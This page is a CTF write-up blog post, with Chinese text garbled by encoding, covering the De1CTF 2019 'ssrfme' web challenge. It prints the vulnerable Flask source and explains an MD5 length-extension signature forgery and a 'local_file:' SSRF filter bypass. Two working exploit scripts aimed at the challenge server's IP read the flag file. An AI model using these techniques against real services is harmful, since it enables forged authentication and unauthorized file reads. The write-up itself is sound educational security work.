<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="å¯¹æœªæ¥çš„æœ€å¤§æ…·æ…¨ï¼Œå°±æ˜¯æŠŠä¸€åˆ‡éƒ½çŒ®ç»™ç°åœ¨ã€‚">
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        De1ctf - undefined
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/" />
        </div>
        <div class="name">
            <i>Luc1fer</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>ä¸»é¡µ</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>æ ‡ç­¾</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>å­˜æ¡£</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>å…³äº</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>æœç´¢</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#De1ctf-2019-WP"><span class="toc-text">De1ctf 2019 WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrfme"><span class="toc-text">ssrfme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æºç åˆ†æ"><span class="toc-text">æºç åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ç¼–å†™è„šæœ¬"><span class="toc-text">ç¼–å†™è„šæœ¬</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#another-way"><span class="toc-text">another way</span></a></li></ol></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">æœç´¢</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        De1ctf
    </div>

    <div class="post-meta">
        <span class="attr">å‘å¸ƒäºï¼š<span>2019-08-16 20:00:50</span></span>
        
        <span class="attr">æ ‡ç­¾ï¼š/
        
        <a class="tag" href="/tags/#ssrf" title="ssrf">ssrf</a>
        <span>/</span>
        
        <a class="tag" href="/tags/#RSA" title="RSA">RSA</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">è®¿é—®ï¼š<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <p>è¿™æ¬¡æ¯”èµ›çœŸçš„è¶…æœ‰æ„æ€çš„ï¼æˆ‘è¶…çº§å–œæ¬¢çš„ï¼åšäº†åŠå¤©å•¥éƒ½æ²¡åšå‡ºæ¥ï¼Œçœ‹ç€é‚£ä¸ªæ¨±èŠ±ğŸŒ¸å…¨ç¨‹é™¶é†‰~</p>
<a id="more"></a>
<h1 id="De1ctf-2019-WP"><a href="#De1ctf-2019-WP" class="headerlink" title="De1ctf 2019 WP"></a>De1ctf 2019 WP</h1><h2 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h2><p>æºç  </p>
<pre><code>#! /usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding(&apos;latin1&apos;)

app = Flask(__name__)

secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result[&apos;code&apos;] = 500
        if (self.checkSign()):
            if &quot;scan&quot; in self.action:
                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)
                resp = scan(self.param)
                if (resp == &quot;Connection Timeout&quot;):
                    result[&apos;data&apos;] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result[&apos;code&apos;] = 200
            if &quot;read&quot; in self.action:
                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)
                result[&apos;code&apos;] = 200
                result[&apos;data&apos;] = f.read()
            if result[&apos;code&apos;] == 500:
                result[&apos;data&apos;] = &quot;Action Error&quot;
        else:
            result[&apos;code&apos;] = 500
            result[&apos;msg&apos;] = &quot;Sign Error&quot;
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False


#generate Sign For Action Scan.
@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])
def geneSign():
    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
    action = &quot;scan&quot;
    return getSign(action, param)


@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])
def challenge():
    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
    ip = request.remote_addr
    if(waf(param)):
        return &quot;No Hacker!!!!&quot;
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route(&apos;/&apos;)
def index():
    return open(&quot;code.txt&quot;,&quot;r&quot;).read()


def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return &quot;Connection Timeout&quot;



def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check=param.strip().lower()
    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
        return True
    else:
        return False


if __name__ == &apos;__main__&apos;:
    app.debug = False
    app.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p><code>Exec()</code>å‡½æ•°é¦–å…ˆè°ƒç”¨<code>checkSign()</code>è¿›è¡Œmd5æ ¡éªŒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é•¿åº¦æ‰©å±•æ”»å‡»ç»•è¿‡ã€‚æ¥ä¸‹æ¥å¯¹scanè¡Œä¸ºè¿›è¡Œæ‰“å¼€æ–‡æœ¬æ–‡ä»¶ï¼Œè°ƒç”¨<code>scan()</code>è¯»å–å†…å®¹ï¼Œç„¶åå°†ç›®æ ‡æ–‡ä»¶å†…å®¹å†™å…¥æ–‡ä»¶ã€‚å¯¹readè¡Œä¸ºè¿›è¡Œåˆšåˆšå†™å…¥æ–‡ä»¶çš„è¯»å–ã€‚</p>
<pre><code>def Exec(self):
    result = {}
    result[&apos;code&apos;] = 500
    if (self.checkSign()):
        if &quot;scan&quot; in self.action:
            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)
            resp = scan(self.param)
            if (resp == &quot;Connection Timeout&quot;):
                result[&apos;data&apos;] = resp
            else:
                print resp
                tmpfile.write(resp)
                tmpfile.close()
            result[&apos;code&apos;] = 200
        if &quot;read&quot; in self.action:
            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)
            result[&apos;code&apos;] = 200
            result[&apos;data&apos;] = f.read()
        if result[&apos;code&apos;] == 500:
            result[&apos;data&apos;] = &quot;Action Error&quot;
    else:
        result[&apos;code&apos;] = 500
        result[&apos;msg&apos;] = &quot;Sign Error&quot;
    return result

def checkSign(self):
    if (getSign(self.action, self.param) == self.sign):
        return True
    else:
        return False</code></pre><p><code>/geneSign</code>è·¯ç”±è´Ÿè´£ç”ŸæˆSignã€‚åŒæ—¶<code>action</code>è¢«é™å®šä¸º<code>scan</code></p>
<pre><code>#generate Sign For Action Scan.
@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])
def geneSign():
    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
    action = &quot;scan&quot;
    return getSign(action, param)</code></pre><p><code>/De1ta</code>è·¯ç”±å¯¹è¯·æ±‚çš„<code>param</code>å‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œç„¶åé€šè¿‡å¯¹<code>Task</code>ç±»ä¼ å…¥ç›¸åº”å‚æ•°æ‰“å°<code>Exec()</code>å‡½æ•°çš„ç»“æœ</p>
<pre><code>@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])
def challenge():
    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
    ip = request.remote_addr
    if(waf(param)):
        return &quot;No Hacker!!!!&quot;
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())</code></pre><p><code>scan()</code>å‡½æ•°æ‰“å¼€<code>param</code>æŒ‡å‘çš„å†…å®¹è¿›è¡Œè¯»å–ï¼Œè¿™æ˜¯æˆ‘ä»¬åˆ©ç”¨<code>ssrf</code>çš„ç‚¹ã€‚</p>
<pre><code>def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return &quot;Connection Timeout&quot;</code></pre><p>getSign()å‡½æ•°å¯¹<code>secerty_key,param,action</code>è¿›è¡Œmd5åŠ å¯†ã€‚</p>
<pre><code>def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>ä»£ç çš„é€»è¾‘å¤§ä½“ä¸Šæ˜¯</p>
<pre><code>åˆå§‹åŒ–å„ä¸ªå‚æ•°-&gt;è¿›å…¥Taskç±»-&gt;æ‰§è¡ŒExec()å‡½æ•°-&gt;æ£€æŸ¥md5å€¼-&gt;å¯¹å‚æ•°ä¸­çš„actionè¿›è¡Œä¸åŒæ“ä½œ-&gt;dumpå‡½æ•°æ‰§è¡Œç»“æœ</code></pre><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡é•¿åº¦æ‰©å±•æ”»å‡»ç»•è¿‡é•¿åº¦åˆ¤æ–­ï¼Œæ ¹æ®æç¤ºflagåœ¨<code>/flag.txt</code>ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯<code>waf()</code>å¯¹<code>gopher</code>å’Œ<code>file</code>è¿›è¡Œè¿‡æ»¤ï¼Œæˆ‘ä»¬æ— æ³•åˆ©ç”¨è¿™ä¸¤ä¸ªåè®®ï¼Œæ ¹æ®CVE-2019-9948(urllib)<a href="https://www.cvedetails.com/cve/CVE-2019-9948/" title="CVE-2019-9948" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2019-9948/</a>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>local_file:///flag.txt</code>æ¥ç»•è¿‡wafã€‚</p>
<h3 id="ç¼–å†™è„šæœ¬"><a href="#ç¼–å†™è„šæœ¬" class="headerlink" title="ç¼–å†™è„šæœ¬"></a>ç¼–å†™è„šæœ¬</h3><pre><code>import urllib,hashpumpy 
import requests

&quot;&quot;&quot;
    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)

    Arguments:
        hexdigest(str):      Hex-encoded result of hashing key + original_data.
        original_data(str):  Known data used to get the hash result hexdigest.
        data_to_add(str):    Data to append
        key_length(int):     Length of unknown data prepended to the hash

    Returns:
        A tuple containing the new hex digest and the new message.

&quot;&quot;&quot;

url = &quot;http://139.180.128.86/&quot;

#get the Sign of Scan
geneSign = &quot;geneSign?&quot;
payload = &quot;local_file:flag.txt&quot;
re = requests.get(url+geneSign+&quot;param=&quot;+payload).text
print re

#hash extend attack
hashs,hashextend = hashpumpy.hashpump(re,payload+&quot;scan&quot;,&quot;read&quot;,16)
print hashs
action = &quot;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read&quot;
cookie = {
    #&quot;action&quot;:urllib.quote(hashextend),
    &quot;action&quot;:action,    
    &quot;sign&quot;:hashs
}
print cookie


re2 = requests.get(url+&apos;De1ta?&apos;+&quot;param=&quot;+payload,cookies=cookie)

print re2.content</code></pre><p>åœ¨ä½¿ç”¨æ‰©å±•æ”»å‡»çš„æ—¶å€™æˆ‘ä»¬éœ€è¦æŠŠæ‰€å¾—ç­¾åå‰é¢çš„ä¿¡æ¯å»æ‰</p>
<pre><code>Input Signature: 785f9921864e8704e5e44e15c8f3d6ce
Input Data: local_file:flag.txtscan
Input Key Length: 16
Input Data to Add: read
636d649a50e61e75436cc1ba50d5a003
local_file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read</code></pre><h3 id="another-way"><a href="#another-way" class="headerlink" title="another way"></a>another way</h3><p>åœ¨ctf timeä¸Šçœ‹åˆ°çš„å›ç­”ï¼Œåˆ†æçš„å¥½ç»†è‡´<a href="https://ctftime.org/writeup/16070" target="_blank" rel="noopener">https://ctftime.org/writeup/16070</a>ã€‚è¿™é‡Œæä¾›äº†å¦ä¸€ç§æ€è·¯</p>
<blockquote>
<p>This will allow us to read the flag into a file, but we will not be able to read it without a valid sign with the action including â€œreadâ€. If we can generate a sign for the action as â€œreadscanâ€, we can perform the scan and read the result in one go.</p>
<p>Notice, geneSign() will perform an md5 hash of secret + param + action so we can pass the value of param as â€œflag.txtreadâ€ (the value of action will be â€œscanâ€) and generate the same hash as if we pass param as â€œflag.txtâ€ and action as â€œreadscanâ€.</p>
<p>â€œflag.txtreadâ€+â€scanâ€ == â€œflag.txtâ€+â€readscanâ€</p>
<p>You could also use a length extension attack, but this way is more simple.</p>
<p>So our exploit is complete.</p>
</blockquote>
<p>è¿™æ˜¯ä»–ä»¬ç¼–å†™çš„è„šæœ¬ï¼šè†œ</p>
<pre><code>import requests

def geneSign(param):
    return requests.get(&quot;http://139.180.128.86/geneSign?param=&quot;+param).text

realParam = &quot;flag.txt&quot;

param = realParam+&quot;read&quot;
sign = geneSign(param)
param = realParam

action = &quot;readscan&quot;

answer = requests.get(&quot;http://139.180.128.86/De1ta?param=&quot;+param, cookies={&quot;action&quot;:action,&quot;sign&quot;:sign}).text

print(answer)</code></pre>
        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "./public/search.xml"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
